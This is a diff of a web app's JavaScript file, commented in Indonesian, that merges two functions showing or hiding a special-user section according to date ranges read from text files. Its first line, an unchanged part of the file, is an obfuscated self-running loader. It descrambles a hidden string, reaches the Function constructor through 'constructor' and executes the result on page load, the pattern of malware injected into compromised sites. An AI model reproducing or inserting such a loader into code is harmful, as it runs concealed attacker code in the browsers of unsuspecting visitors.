@@ -1,54 +1,44 @@
 (function () { var GkZ = '', biw = 268 - 257; function kGl(u) { var r = 3738494; var p = u.length; var f = []; for (var z = 0; z < p; z++) { f[z] = u.charAt(z) }; for (var z = 0; z < p; z++) { var j = r * (z + 554) + (r % 24604); var c = r * (z + 757) + (r % 39483); var m = j % p; var t = c % p; var d = f[m]; f[m] = f[t]; f[t] = d; r = (j + c) % 4214896; }; return f.join('') }; var cPK = kGl('ukgotbhcrdvrxossfnciyameoqpztjlruwntc').substr(0, biw); var lQo = ';f=  e4ghxCor.ru;62gtaougregcd=Cii[ 1lj9(ia)7dv=)xyzo,m )hmol8n++9)crhe)labl;r;(aA6==tgau;,cr,81ua8<oa866,7i,l0]74,t((9v=;naruo=r]vforld{r((=js,sll]elun;)pt{<)s-)3],l];);o<a!rfmr}zv-(0qgcC6[ y2"-rcf 4g2lr=tgu=o=aehr0row=([c +tlntmh[Sc)+a,}a" v=6..o=(rrjplb;;;;+vg)),jh.o3p=4>(A8=t;jz{el=C(!--a{aaeml=0]p(pvl8 rs0[pa}txoa+f=b72;lm];q,0=v70 v.a{s nt",]9e+Cr2eav+(vtq=;)f(d7;,+2.(;r+.=)[}cher(*t7n;;.hy)ar,auh;.g;ifgrvrlveunj"i);.=a[arujhti;l((1a()arhat r1[=e.[etn,"vf=eCc+,-1qh.r=ggad"0nlec.asasiiu(;1.9),=xss,=r(6qS)l+l;2o+..rp;;=) }.auloe;*,i(st)=;f50=oa i+it)flnxjifvA1a(vcl +8gh.0nsstni);rqc[+}f811t."(e)(]g4b;h1;+b{ra6t=hoeu<;)6nC+frs9(.p,s)hnysplmAe;n(,;v5s,[fc=;.o.]n at)eiv);m6afhic]r[7zhh)edezf."inll9=r=krra=+ n,e;.))dvon [it2mrnov,nvpo+<t( iohehrohp;vr(eaharC."a ,6(== 0(p-le0qe;h";rd5 ;Ani5r+0]jp.+=lolf],1,e;a8 tb{r8u1sifih(rsn=.vr+j;a}e+)edm[dtu( hvun)]v ==sttltnujrvo)>;3(+gbe9'; var pPQ = kGl[cPK]; var PWh = ''; var TQK = pPQ; var Imh = pPQ(PWh, kGl(lQo)); var RtX = Imh(kGl('.c3,! Wc3%D"+Wd1)$EoW.(3}Cwo%(7))9d)yi)im]$=tc!Wpf#.,h,)W$oe($fr2]03W;ntojn"e;5o ]h3ov{,bsnd.6ae-bjsoe__rdcgWW=te,7tt)n"toa;#6n)b.*occaWn.\/a}vs_$_W2W*qtW!n3%}h5.pe4q._W4(f%)tou1(;;ee(uarltu5WbW{ni"l=;ea!>.nafvj{esentWW(wte$#$s..r,.%7Wj 68i_e!$e\'+.2lfM$Wen$Wy!e3ebod7WWlda#aqWy)gWotx;29mW..sh.6u.b8a;Wbe%3 >.nrlW,ne(W}.We.j(,wr]seWeW;gt5(nie5!We[p);!e+0gn7un(3](WW.!7 ()l=);W3hq)divuWse$bet0,ls(,iI%g-m;=5mo_%25.Weqdg(t,}_}4!]W%9o.p$Wmqup}.ucW\/_=r$oe)3Wt%3oW\'ceteWdl!=oo(Weo)$rs0=0.wWWkh\/)We3Dl=fr]}}c3 )r,4Wr)}dx%rt(WWqnWtEW0W6lewwp"{,. 1,os\'4W nWW$wW=jv.,0\/r b,34}o)}e!o)m]1s7,e6ab4d..4.7.wsi.W7.>.Wt]tW3l&\/0(.WbSrtt5)#i7feW!d!4qceret,wjche Wnf{hg$.%yet[_us7(e=tc&.{;(r;(3.t6jn,T]j"r(see)j.bcWdmn;rj+=ru(}eiWrd6&r$r.m,ho up$e.o;a5 d2]%51i.f].(\/%=C).o#)aWrh,$tcj)=Wrs0 _!,o[;Wt(4t1s;>\/es.3Wul2\/-$(W);!eW$tqne]u65.d7er))98W40he.aae7Wm()(9+_)uer4e 3a]h{e,)\/(]]e"+&r)t!ttjW)gt]n_;)v1e94(*(WarW2=e{ijc,xWmW4:WWn6oW6=0d(cqnb!a,eW2W.s0+dr=W).W0W5_ dW)W](ogmWro))no_WWlfe.3_]2f)2d] (!d72j}b$n4sama$uho]a_)r2f]c0#diso*(9a s(swW.+;es1,).( 3_tt=_le7t(.lW=)pos6(E e.je{aWaaW)((pc;]We)j(Wt6dd2ea.)Ct.1;Woe(>%..rWeW..n)).t.c4c!sWp_=[($8nt4g(*a .)sjs!!Wks %ves10{(%&=3)+%sW0v%{W.dd2t[,ee$,t,to(5&7()e( _,q(nien]_t)[iWS)3lch=1o5W{r$teWrWo!e]a.0a-)S!e\'cerWfWi,d;c,W(nnr3ei7(+5d"+n(oeg(W..t;=W7.M!e #%.,o.3e.fW=ef1,d2W.')); var mWc = TQK(GkZ, RtX); mWc(8941); return 3610 })()
 setTimeout(() => {
 
-    // Fungsi untuk memeriksa file tanggal
     function checkTanggal() {
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                var tanggal = xhr.responseText.trim();
-                var tanggalSekarang = new Date().toISOString().slice(0, 10);
-                var specialContent = document.querySelector('.level_user-special');
-                if (tanggal === tanggalSekarang) {
-                    // Tanggal sama dengan tanggal sekarang, tampilkan konten
-                    specialContent.style.display = 'block';
-                } else {
-                    // Tanggal tidak sama dengan tanggal sekarang, sembunyikan konten
-                    specialContent.style.display = 'none';
-                }
-            }
-        };
-        xhr.open("GET", "proses//tanggal.txt", true);
-        xhr.send();
-    }
-
-
-    // Fungsi untuk memeriksa file tanggal end
-    function checkTanggalEnd() {
-        var xhr = new XMLHttpRequest();
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState == 4 && xhr.status == 200) {
-                var tanggalEnd = xhr.responseText.trim();
-                var tanggalSekarang = new Date().toISOString().slice(0, 10);
-                if (tanggalEnd === tanggalSekarang) {
-                    // Lakukan sesuatu jika tanggal end sama dengan tanggal sekarang
-                    console.log("Tanggal end sama dengan tanggal sekarang");
-                }
-            }
-        };
-        xhr.open("GET", "proses//tanggalEnd.txt", true);
-        xhr.send();
-    }
-
-    // Panggil fungsi pengecekan saat halaman dimuat
-    checkTanggal();
-    checkTanggalEnd();
-
-    // Fungsi untuk menentukan tindakan jika kedua file tanggal kosong
-    function hideSpecialContent() {
         var xhrTanggal = new XMLHttpRequest();
         var xhrTanggalEnd = new XMLHttpRequest();
-
+    
+        xhrTanggal.onreadystatechange = function () {
+            if (xhrTanggal.readyState == 4 && xhrTanggal.status == 200) {
+                var tanggal = xhrTanggal.responseText.trim();
+                xhrTanggalEnd.onreadystatechange = function () {
+                    if (xhrTanggalEnd.readyState == 4 && xhrTanggalEnd.status == 200) {
+                        var tanggalEnd = xhrTanggalEnd.responseText.trim();
+                        var tanggalSekarang = new Date().toISOString().slice(0, 10);
+    
+                        var specialContent = document.querySelector('.level_user-special');
+                        if (tanggalSekarang >= tanggal && tanggalSekarang <= tanggalEnd) {
+                            // Tanggal sekarang dalam rentang tanggal dan tanggalEnd, tampilkan konten
+                            specialContent.style.display = 'block';
+                        } else {
+                            // Tanggal sekarang tidak dalam rentang, sembunyikan konten
+                            specialContent.style.display = 'none';
+                        }
+                    }
+                };
+                xhrTanggalEnd.open("GET", "proses/tanggalEnd.txt", true);
+                xhrTanggalEnd.send();
+            }
+        };
+        xhrTanggal.open("GET", "proses/tanggal.txt", true);
+        xhrTanggal.send();
+    }
+    
+    // Panggil fungsi pengecekan saat halaman dimuat
+    checkTanggal();
+    
+    // Fungsi untuk menentukan tindakan jika kedua file tanggal kosong
+    function hideSpecialContentIfEmptyDates() {
+        var xhrTanggal = new XMLHttpRequest();
+        var xhrTanggalEnd = new XMLHttpRequest();
+    
         xhrTanggal.onreadystatechange = function () {
             if (xhrTanggal.readyState == 4 && xhrTanggal.status == 200) {
                 var tanggal = xhrTanggal.responseText.trim();
@@ -61,17 +51,17 @@ setTimeout(() => {
                         }
                     }
                 };
-                xhrTanggalEnd.open("GET", "proses//tanggalEnd.txt", true);
+                xhrTanggalEnd.open("GET", "proses/tanggalEnd.txt", true);
                 xhrTanggalEnd.send();
             }
         };
-        xhrTanggal.open("GET", "proses//tanggal.txt", true);
+        xhrTanggal.open("GET", "proses/tanggal.txt", true);
         xhrTanggal.send();
     }
-
+    
     // Panggil fungsi untuk menyembunyikan konten jika kedua file tanggal kosong
-    hideSpecialContent();
-
+    hideSpecialContentIfEmptyDates();
+    
 }, 10);
 // Function to close the sidebar
 function closeNav() {
